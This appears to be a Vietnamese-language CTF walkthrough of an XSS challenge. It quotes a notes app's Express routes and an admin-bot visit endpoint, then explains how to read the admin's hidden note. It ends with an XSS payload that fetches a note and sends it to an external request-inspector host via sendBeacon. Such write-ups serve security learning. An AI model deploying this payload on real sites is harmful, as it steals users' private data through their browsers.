# task
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/9e208b49-bfd9-4263-ae09-c9a9f32f5edc)

# solution
```
router.get("/note/:uuid", async (req, res) => {
    try {
        const { uuid } = req.params;
        const message = await db.getNote(uuid);

        if (!message) return res.status(404).send({
            error: "Can't find this note!",
        });

        if (message.hidden && !isAdmin(req))
            return res.status(401).send({
                error: "Sorry, this note has been hidden by admin!",
            });

        return res.status(200).send({
            message: message.message,
        });
    } catch (error) {
        console.error(error);
        res.status(500).send({
            error: "Something went wrong!",
        });
    }
});

router.get("/visit/:uuid", async (req, res) => {
    const { uuid } = req.params;
    if (uuid) {
        try {
            await visit(`http://127.0.0.1:1337/notes?uuid=${uuid}`, authenSecret);
            res.status(200).json({ message: 'Bot has been visited' });
        } catch (e) {
            console.log(e);
        }
    } else {
        res.status(400).json({ error: 'Invalid uuid' });
    }
});
```
-Trong đoạn source này thì ta cũng có thể nhìn ra ý tưởng của bài này là sử dụng xss để đọc note của admin thông qua con bot 
-Lúc đầu mình định dùng xss để lấy phiên của con bot cơ nhưng đề ko cho thế ;vv do con bot có thêm thuộc tính httpOnly nên ta không thể lấy cookie của bot bằng xss được  
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/1a691503-d96f-4bcd-a7b8-340b428803f8)

*note: trong giải mình ko làm được câu này di mình ngu đặt url của fetch là note?uuid=1 đáng lẽ ra phải gọi api của trang web mới lấy được message 

![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/f7ac6a07-b2b4-4ff6-ae47-7b13ef8b8916)

payload:
```
<img src=1 onerror='fetch("/note/1").then(r=>r.text()).then(z=>navigator.sendBeacon("https://01hj46va4def4y9g56wkve0bd300-f6e179feb73b7ed35edf.requestinspector.com", z))'>
```
